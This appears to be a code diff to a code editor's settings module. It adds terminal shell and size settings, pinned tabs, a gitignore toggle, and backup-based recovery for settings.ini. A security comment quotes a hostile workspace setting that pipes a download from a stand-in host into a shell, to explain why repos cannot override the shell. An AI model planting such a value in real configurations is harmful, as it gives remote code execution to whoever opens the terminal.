@@ -69,6 +69,12 @@ export interface WorkbenchSettings {
   terminalFontSize: number;
   /** Terminal: cursor style */
   terminalCursorStyle: string;
+  /** Terminal: shell command. Empty string = platform default (zsh / bash / powershell). #52. */
+  terminalShell: string;
+  /** Terminal: row count for the PTY grid. Larger fits more output before scroll. #54. */
+  terminalRows: number;
+  /** Terminal: column count for the PTY grid. Larger means longer lines before wrap. #54. */
+  terminalCols: number;
   /** AI: inline completion delay in ms */
   aiInlineCompletionDelay: number;
   /** Search: use ignore files (.gitignore) */
@@ -108,10 +114,14 @@ export interface WorkbenchSettings {
   sidebarWidth: number;
   /** Whether the explorer shows files starting with `.`. Default false. #95. */
   explorerShowHiddenFiles: boolean;
+  /** Whether the explorer hides files matched by .gitignore. Default true. #50. */
+  explorerRespectGitignore: boolean;
   /** Bitmask of which built-in extensions are enabled. Default all on. #57. */
   extensionsEnabledMask: number;
   /** Pipe-separated list of open tab file paths */
   lastOpenTabs: string;
+  /** Pin mask matching lastOpenTabs — `1`/`0` chars per tab. #26. */
+  lastPinnedTabs: string;
   /** Index of the active tab at last save */
   lastActiveTab: number;
   /** Cursor line of the active tab at last save (0-based). SHIP-V1-GAPS.md #43. */
@@ -136,6 +146,19 @@ function getSettingsPath(): string {
 
 function getSettingsDir(): string {
   return getAppDataDir();
+}
+
+// Last-known-good backup of settings.ini. The flush writes this BEFORE
+// overwriting the live file, so a crash / forced-quit / disk-full during
+// the non-atomic settings.ini write (Perry has no sync rename, so a true
+// atomic temp+rename isn't possible in the 500ms sync flush) can't wipe
+// every user setting — recovery on load falls back to this copy, losing at
+// most the <=500ms of changes since the previous successful flush instead
+// of the entire config.
+function getSettingsBackupPath(): string {
+  let p = getAppDataDir();
+  p += '/settings.ini.bak';
+  return p;
 }
 
 function ensureDir(dir: string): void {
@@ -177,6 +200,9 @@ let _settings_editorTrimFinalNewlines: number = 1;
 let _settings_editorFormatNormalizeIndent: number = 0;
 let _settings_terminalFontSize: number = 13;
 let _settings_terminalCursorStyle: string = 'block';
+let _settings_terminalShell: string = '';
+let _settings_terminalRows: number = 30;
+let _settings_terminalCols: number = 120;
 let _settings_aiInlineCompletionDelay: number = 300;
 let _settings_searchUseIgnoreFiles: number = 1;
 let _settings_searchFollowSymlinks: number = 1;
@@ -199,12 +225,14 @@ let _settings_syncDeviceToken: string = '';
 let _settings_telemetryEnabled: number = 0;
 let _settings_setupComplete: number = 0;
 let _settings_lastOpenTabs: string = '';
+let _settings_lastPinnedTabs: string = '';
 let _settings_lastActiveTab: number = 0;
 let _settings_lastActiveCursorLine: number = 0;
 let _settings_lastActiveCursorCol: number = 0;
 let _settings_lastActiveScrollTop: number = 0;
 let _settings_sidebarWidth: number = 220;
 let _settings_explorerShowHiddenFiles: number = 0;
+let _settings_explorerRespectGitignore: number = 1;
 let _settings_extensionsEnabledMask: number = 2047; // all 11 builtin extensions on by default
 let _settingsLoaded: number = 0;
 let _settingsVersion: number = 0;
@@ -237,7 +265,20 @@ export function initSettings(): void {
       text = readFileSync(path);
     }
   } catch (e: any) {
-    return;
+    text = '';
+  }
+  // Recovery: if settings.ini is missing/empty/truncated (a crash during
+  // the non-atomic flush write), fall back to the .bak written before the
+  // last overwrite. Bounds worst-case loss to <=500ms of changes instead
+  // of the entire user config.
+  if (text.length < 3) {
+    try {
+      const bp = getSettingsBackupPath();
+      if (existsSync(bp)) {
+        const btext = readFileSync(bp);
+        if (btext.length >= 3) text = btext;
+      }
+    } catch (_re: any) { /* no usable backup — fall through to defaults */ }
   }
   if (text.length < 3) return;
 
@@ -279,6 +320,9 @@ export function initSettings(): void {
     if (key === 'editorFormatNormalizeIndent') _settings_editorFormatNormalizeIndent = val === '1' ? 1 : 0;
     if (key === 'terminalFontSize') { const n = parseInt(val); if (n > 0) _settings_terminalFontSize = n; }
     if (key === 'terminalCursorStyle') _settings_terminalCursorStyle = val;
+    if (key === 'terminalShell') _settings_terminalShell = val;
+    if (key === 'terminalRows') { const n = parseInt(val); if (n >= 4 && n <= 200) _settings_terminalRows = n; }
+    if (key === 'terminalCols') { const n = parseInt(val); if (n >= 40 && n <= 500) _settings_terminalCols = n; }
     if (key === 'aiInlineCompletionDelay') { const n = parseInt(val); if (n >= 0) _settings_aiInlineCompletionDelay = n; }
     if (key === 'searchUseIgnoreFiles') _settings_searchUseIgnoreFiles = val === '1' ? 1 : 0;
     if (key === 'searchFollowSymlinks') _settings_searchFollowSymlinks = val === '1' ? 1 : 0;
@@ -301,12 +345,14 @@ export function initSettings(): void {
     if (key === 'telemetryEnabled') _settings_telemetryEnabled = val === '1' ? 1 : 0;
     if (key === 'setupComplete') _settings_setupComplete = val === '1' ? 1 : 0;
     if (key === 'lastOpenTabs') _settings_lastOpenTabs = val;
+    if (key === 'lastPinnedTabs') _settings_lastPinnedTabs = val;
     if (key === 'lastActiveTab') { const n = parseInt(val); if (n >= 0) _settings_lastActiveTab = n; }
     if (key === 'lastActiveCursorLine') { const n = parseInt(val); if (n >= 0) _settings_lastActiveCursorLine = n; }
     if (key === 'lastActiveCursorCol') { const n = parseInt(val); if (n >= 0) _settings_lastActiveCursorCol = n; }
     if (key === 'lastActiveScrollTop') { const n = parseInt(val); if (n >= 0) _settings_lastActiveScrollTop = n; }
     if (key === 'sidebarWidth') { const n = parseInt(val); if (n >= 120 && n <= 800) _settings_sidebarWidth = n; }
     if (key === 'explorerShowHiddenFiles') _settings_explorerShowHiddenFiles = val === '1' ? 1 : 0;
+    if (key === 'explorerRespectGitignore') _settings_explorerRespectGitignore = val === '0' ? 0 : 1;
     if (key === 'extensionsEnabledMask') { const n = parseInt(val); if (n >= 0 && n <= 2047) _settings_extensionsEnabledMask = n; }
   }
 
@@ -346,6 +392,9 @@ function buildSnapshot(): WorkbenchSettings {
     editorFormatNormalizeIndent: _settings_editorFormatNormalizeIndent > 0,
     terminalFontSize: _settings_terminalFontSize,
     terminalCursorStyle: _settings_terminalCursorStyle,
+    terminalShell: _settings_terminalShell,
+    terminalRows: _settings_terminalRows,
+    terminalCols: _settings_terminalCols,
     aiInlineCompletionDelay: _settings_aiInlineCompletionDelay,
     searchUseIgnoreFiles: _settings_searchUseIgnoreFiles > 0,
     searchFollowSymlinks: _settings_searchFollowSymlinks > 0,
@@ -368,12 +417,14 @@ function buildSnapshot(): WorkbenchSettings {
     telemetryEnabled: _settings_telemetryEnabled > 0,
     setupComplete: _settings_setupComplete > 0,
     lastOpenTabs: _settings_lastOpenTabs,
+    lastPinnedTabs: _settings_lastPinnedTabs,
     lastActiveTab: _settings_lastActiveTab,
     lastActiveCursorLine: _settings_lastActiveCursorLine,
     lastActiveCursorCol: _settings_lastActiveCursorCol,
     lastActiveScrollTop: _settings_lastActiveScrollTop,
     sidebarWidth: _settings_sidebarWidth,
     explorerShowHiddenFiles: _settings_explorerShowHiddenFiles > 0,
+    explorerRespectGitignore: _settings_explorerRespectGitignore > 0,
     extensionsEnabledMask: _settings_extensionsEnabledMask,
   };
 }
@@ -490,6 +541,15 @@ function serializeFromVars(): string {
   out += 'terminalCursorStyle=';
   out += _settings_terminalCursorStyle;
   out += '\n';
+  out += 'terminalShell=';
+  out += _settings_terminalShell;
+  out += '\n';
+  out += 'terminalRows=';
+  out += intToStr(_settings_terminalRows);
+  out += '\n';
+  out += 'terminalCols=';
+  out += intToStr(_settings_terminalCols);
+  out += '\n';
   out += 'aiInlineCompletionDelay=';
   out += intToStr(_settings_aiInlineCompletionDelay);
   out += '\n';
@@ -556,6 +616,9 @@ function serializeFromVars(): string {
   out += 'lastOpenTabs=';
   out += _settings_lastOpenTabs;
   out += '\n';
+  out += 'lastPinnedTabs=';
+  out += _settings_lastPinnedTabs;
+  out += '\n';
   out += 'lastActiveTab=';
   out += intToStr(_settings_lastActiveTab);
   out += '\n';
@@ -574,6 +637,9 @@ function serializeFromVars(): string {
   out += 'explorerShowHiddenFiles=';
   out += _settings_explorerShowHiddenFiles > 0 ? '1' : '0';
   out += '\n';
+  out += 'explorerRespectGitignore=';
+  out += _settings_explorerRespectGitignore > 0 ? '1' : '0';
+  out += '\n';
   out += 'extensionsEnabledMask=';
   out += intToStr(_settings_extensionsEnabledMask);
   out += '\n';
@@ -589,11 +655,26 @@ function persistToDisk(): void {
 
 function _flushSettingsToDisk(): void {
   if (_settingsDirty < 1) return;
-  _settingsDirty = 0;
   try {
     ensureDir(getSettingsDir());
-    writeFileSync(getSettingsPath(), serializeFromVars());
-  } catch (e: any) { /* ignore */ }
+    const sp = getSettingsPath();
+    // Step A: snapshot the current good settings.ini → .bak BEFORE we
+    // overwrite it. A crash here leaves settings.ini untouched (no
+    // recovery needed). A crash during step B leaves this .bak (the
+    // previous good state) intact for load-time recovery.
+    try {
+      if (existsSync(sp)) {
+        const prev = readFileSync(sp);
+        if (prev.length >= 3) writeFileSync(getSettingsBackupPath(), prev);
+      }
+    } catch (_be: any) { /* backup best-effort; never block the real write */ }
+    // Step B: write the live file.
+    writeFileSync(sp, serializeFromVars());
+    // Only now is the change durably persisted — clear the dirty flag
+    // AFTER success so a failed write (disk full / permission) is retried
+    // on the next tick instead of being silently dropped.
+    _settingsDirty = 0;
+  } catch (e: any) { /* keep _settingsDirty=1 → retry next 500ms tick */ }
 }
 
 // Self-contained flush timer — fires every 500ms, writes only if dirty
@@ -625,6 +706,18 @@ const WORKSPACE_OVERRIDABLE: Record<string, number> = {
   'editorCursorStyle': 1,
   'filesAutoSave': 1,
   'filesAutoSaveDelay': 1,
+  // SECURITY: `terminalShell` is deliberately NOT workspace-overridable.
+  // The overlay applies keys from a cloned repo's `.hone/settings.ini`
+  // automatically. If `terminalShell` were overridable a hostile repo could
+  // ship `.hone/settings.ini` with `terminalShell=/bin/sh -c "curl evil|sh"`
+  // and get arbitrary code execution the moment the victim opens the
+  // integrated terminal — no further interaction. This is the exact
+  // malicious-workspace-settings class VS Code gates behind Workspace Trust.
+  // It is a strictly worse hazard than the AI-key/sync-token globals that
+  // were already (correctly) excluded. Until #58 workspace-trust actually
+  // gates plugin/exec surfaces, the shell command must stay user-global-only.
+  'terminalRows': 1,
+  'terminalCols': 1,
   'filesTrimTrailingWhitespace': 1,
   'editorInsertFinalNewline': 1,
   'editorTrimFinalNewlines': 1,
@@ -715,6 +808,9 @@ function applyOverlayKey(key: string, val: string): number {
   if (key === 'searchFollowSymlinks') { _settings_searchFollowSymlinks = val === '1' ? 1 : 0; return 1; }
   if (key === 'terminalFontSize') { const n = parseInt(val); if (n > 0) { _settings_terminalFontSize = n; return 1; } return 0; }
   if (key === 'terminalCursorStyle') { _settings_terminalCursorStyle = val; return 1; }
+  if (key === 'terminalShell') { _settings_terminalShell = val; return 1; }
+  if (key === 'terminalRows') { const n = parseInt(val); if (n >= 4 && n <= 200) { _settings_terminalRows = n; return 1; } return 0; }
+  if (key === 'terminalCols') { const n = parseInt(val); if (n >= 40 && n <= 500) { _settings_terminalCols = n; return 1; } return 0; }
   return 0;
 }
 
@@ -755,6 +851,7 @@ export function setStringSetting(key: string, value: string): void {
   if (key === 'syncAuthUrl') _settings_syncAuthUrl = value;
   if (key === 'syncDeviceToken') _settings_syncDeviceToken = value;
   if (key === 'lastOpenTabs') _settings_lastOpenTabs = value;
+  if (key === 'lastPinnedTabs') _settings_lastPinnedTabs = value;
   persistToDisk();
   notifyListeners();
 }
@@ -772,6 +869,11 @@ export function getLastOpenFolder(): string {
 /** Get the pipe-separated list of last open tab paths. */
 export function getLastOpenTabs(): string {
   return _settings_lastOpenTabs;
+}
+
+/** SHIP-V1-GAPS.md #26: pin mask matching the order of `lastOpenTabs`. */
+export function getLastPinnedTabs(): string {
+  return _settings_lastPinnedTabs;
 }
 
 /** Get the index of the last active tab. */
@@ -812,6 +914,7 @@ export function setBoolSetting(key: string, value: number): void {
   if (key === 'searchUseIgnoreFiles') _settings_searchUseIgnoreFiles = value;
   if (key === 'searchFollowSymlinks') _settings_searchFollowSymlinks = value;
   if (key === 'explorerShowHiddenFiles') _settings_explorerShowHiddenFiles = value;
+  if (key === 'explorerRespectGitignore') _settings_explorerRespectGitignore = value;
   if (key === 'extensionsEnabledMask') { if (value >= 0 && value <= 2047) _settings_extensionsEnabledMask = value; }
   if (key === 'syncEnabled') _settings_syncEnabled = value;
   if (key === 'telemetryEnabled') _settings_telemetryEnabled = value;
